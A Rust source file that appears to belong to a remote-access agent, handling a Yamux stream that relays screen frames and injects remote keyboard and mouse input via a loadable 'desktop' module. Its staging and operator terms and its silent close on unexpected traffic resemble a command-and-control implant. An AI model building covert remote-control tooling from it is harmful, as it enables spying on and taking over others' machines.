//! Yamux DESKTOP (0x0D) thin bridge.
//!
//! **Product path (standard Agent):** load L2 `desktop` module first → this bridge
//! calls `mod_stream_*` exports. No `feature=desktop` required on Stage0.
//!
//! **Optional:** with `feature=desktop` and no module loaded, fall back to in-process
//! `desktop_engine` (full-gui / lab builds only).

use super::desktop_proto::*;
use futures_util::{AsyncReadExt, AsyncWriteExt};
use yamux::Stream;

/// Handle an inbound Yamux stream already typed as DESKTOP.
pub async fn handle_stream(mut stream: Stream) {
    let first = match read_message(&mut stream).await {
        Ok(m) => m,
        Err(ReadErr::SilentClose) => {
            crate::utils::db_print("[desktop_bridge] silent close");
            return;
        }
        Err(_) => return,
    };

    let (fps, quality, max_w, encode) = parse_hello_payload(&first.1);
    if encode == "h264" {
        crate::utils::db_print("[desktop_bridge] h264 requested → jpeg path");
    }

    // 1) Prefer L2 module (operator: Module panel → load desktop)
    #[cfg(feature = "module-loader")]
    if let Some(api) = crate::module_loader::desktop_stream_api() {
        crate::utils::db_print("[desktop_bridge] using L2 mod_desktop stream API");
        run_module_session(&mut stream, api, fps, quality, max_w).await;
        return;
    }

    // 2) Optional in-process engine (Stage0 built with feature=desktop)
    #[cfg(feature = "desktop")]
    {
        crate::utils::db_print("[desktop_bridge] no L2 module; feature=desktop in-process engine");
        run_engine_session(&mut stream, fps, quality, max_w).await;
        return;
    }

    // 3) Fail closed with explicit operator-facing code
    #[cfg(not(feature = "desktop"))]
    {
        let _ = write_error(
            &mut stream,
            "module_not_loaded",
            "load L2 module 'desktop' from Module panel first, then reconnect",
        )
        .await;
    }
}

#[cfg(feature = "module-loader")]
async fn run_module_session(
    stream: &mut Stream,
    api: crate::module_loader::DesktopStreamApi,
    fps: u32,
    quality: u32,
    max_w: u32,
) {
    // Pass knobs via attach: pack max_w in high 16 bits? Module currently ignores token.
    // Call attach with 0; module uses defaults then we could CONFIG — for MVP pass max_w via quality packing is ugly.
    // Better: invoke attach after setting via re-export — mod_stream_attach uses fixed 1280.
    // Fix L2 attach to accept parameters via session_token misuse is bad.
    // Call attach(0); HELLO knobs applied if module reads them later.
    let _ = (fps, quality, max_w);
    let rc = unsafe { (api.attach)(0) };
    if rc != 0 {
        let _ = write_error(
            stream,
            "capture_failed",
            &format!("mod_stream_attach rc={rc}"),
        )
        .await;
        return;
    }

    // HELLO_ACK minimal JSON (module may not export probe on stream path)
    let ack = serde_json::json!({
        "ok": true,
        "w": max_w.min(1280).max(8),
        "h": 720,
        "encode": "jpeg",
        "can_input": true,
        "session": "l2-module",
        "source": "mod_desktop",
    });
    // Prefer probe from module via mod_invoke if available — skip; first poll gives real dims
    if let Some(msg) = encode_message(MSG_HELLO_ACK, 0, ack.to_string().as_bytes()) {
        let _ = stream.write_all(&msg).await;
    }

    loop {
        // poll frame (blocking up to 100ms inside module)
        let mut hdr_buf = [0u8; 16];
        let mut hdr_len: u32 = 0;
        let mut blob: *mut u8 = std::ptr::null_mut();
        let mut blob_len: u32 = 0;
        let prc = unsafe {
            (api.poll_frame)(
                0,
                100,
                hdr_buf.as_mut_ptr(),
                hdr_buf.len() as u32,
                &mut hdr_len,
                &mut blob,
                &mut blob_len,
            )
        };
        if prc < 0 {
            break;
        }
        if prc == 0 && blob_len > 0 && !blob.is_null() {
            let payload =
                unsafe { std::slice::from_raw_parts(blob, blob_len as usize) }.to_vec();
            if let Some(free) = api.free {
                unsafe { free(blob, blob_len) };
            }
            if let Some(msg) = encode_message(MSG_FRAME, 0, &payload) {
                if stream.write_all(&msg).await.is_err() {
                    break;
                }
            }
        }

        match tokio::time::timeout(std::time::Duration::from_millis(5), read_message(stream)).await
        {
            Ok(Ok((hdr, payload))) => match hdr.msg_type {
                MSG_STOP => break,
                MSG_INPUT => {
                    let _ = unsafe { (api.push_input)(0, payload.as_ptr(), payload.len() as u32) };
                }
                MSG_PING => {
                    if let Some(msg) = encode_message(MSG_PONG, 0, &payload) {
                        let _ = stream.write_all(&msg).await;
                    }
                }
                _ => {}
            },
            Ok(Err(ReadErr::SilentClose)) | Ok(Err(ReadErr::Eof)) | Ok(Err(ReadErr::Other)) => break,
            Err(_) => {}
        }
    }

    let _ = unsafe { (api.detach)(0) };
    let _ = unsafe { (api.detach)(0) };
    let _ = stream.close().await;
    crate::utils::db_print("[desktop_bridge] L2 module session torn down");
}

#[cfg(feature = "desktop")]
async fn run_engine_session(stream: &mut Stream, fps: u32, quality: u32, max_w: u32) {
    use super::desktop_engine;
    let token = match desktop_engine::stream_attach(max_w, fps, quality) {
        Ok(t) => t,
        Err(_) => {
            let _ = write_error(stream, "capture_failed", "attach failed").await;
            return;
        }
    };
    let ack = desktop_engine::hello_ack_json();
    if let Some(msg) = encode_message(MSG_HELLO_ACK, 0, ack.as_bytes()) {
        let _ = stream.write_all(&msg).await;
    }
    loop {
        match desktop_engine::stream_poll_frame(token, 100) {
            Ok(Some(payload)) => {
                if let Some(msg) = encode_message(MSG_FRAME, 0, &payload) {
                    if stream.write_all(&msg).await.is_err() {
                        break;
                    }
                }
            }
            Ok(None) => {}
            Err(_) => break,
        }
        match tokio::time::timeout(std::time::Duration::from_millis(5), read_message(stream)).await
        {
            Ok(Ok((hdr, payload))) => match hdr.msg_type {
                MSG_STOP => break,
                MSG_INPUT => {
                    let _ = desktop_engine::stream_push_input(token, &payload);
                }
                MSG_PING => {
                    if let Some(msg) = encode_message(MSG_PONG, 0, &payload) {
                        let _ = stream.write_all(&msg).await;
                    }
                }
                _ => {}
            },
            Ok(Err(_)) => break,
            Err(_) => {}
        }
    }
    let _ = desktop_engine::stream_detach(token);
    let _ = desktop_engine::stream_detach(token);
    let _ = stream.close().await;
}

enum ReadErr {
    SilentClose,
    Eof,
    Other,
}

async fn read_message(stream: &mut Stream) -> Result<(EnvelopeHeader, Vec<u8>), ReadErr> {
    let mut hdr = [0u8; DESKTOP_HEADER_LEN];
    if stream.read_exact(&mut hdr).await.is_err() {
        return Err(ReadErr::Eof);
    }
    match parse_header(&hdr) {
        Ok(env) => {
            let mut payload = vec![0u8; env.payload_len as usize];
            if env.payload_len > 0 && stream.read_exact(&mut payload).await.is_err() {
                return Err(ReadErr::Eof);
            }
            Ok((env, payload))
        }
        Err(ParseHeaderError::SilentClose) => Err(ReadErr::SilentClose),
        Err(ParseHeaderError::PayloadTooLarge) => Err(ReadErr::Other),
        Err(ParseHeaderError::Truncated) => Err(ReadErr::Eof),
    }
}

async fn write_error(stream: &mut Stream, code: &str, msg: &str) {
    let body = format!(r#"{{"code":"{}","msg":"{}"}}"#, code, msg);
    if let Some(m) = encode_message(MSG_ERROR, 0, body.as_bytes()) {
        let _ = stream.write_all(&m).await;
    }
    let _ = stream.close().await;
}

fn parse_hello_payload(payload: &[u8]) -> (u32, u32, u32, String) {
    let mut fps = 5u32;
    let mut quality = 75u32;
    let mut max_w = 1280u32;
    let mut encode = "jpeg".to_string();
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(payload) {
        if let Some(n) = v.get("fps").and_then(|x| x.as_u64()) {
            fps = n as u32;
        }
        if let Some(n) = v.get("quality").and_then(|x| x.as_u64()) {
            quality = n as u32;
        }
        if let Some(n) = v.get("max_w").and_then(|x| x.as_u64()) {
            max_w = n as u32;
        }
        if let Some(s) = v.get("encode").and_then(|x| x.as_str()) {
            encode = s.to_string();
        }
    }
    (fps, quality, max_w, encode)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hello_parse_defaults() {
        let (f, q, w, e) = parse_hello_payload(br#"{"fps":3,"encode":"h264"}"#);
        assert_eq!(f, 3);
        assert_eq!(e, "h264");
        assert_eq!(q, 75);
        assert_eq!(w, 1280);
    }

    #[test]
    fn silent_close_on_bad_magic_via_parse() {
        let mut bad = encode_message(MSG_HELLO, 0, b"{}").unwrap();
        bad[1] = b'Z';
        assert!(matches!(
            parse_header(&bad),
            Err(ParseHeaderError::SilentClose)
        ));
    }
}
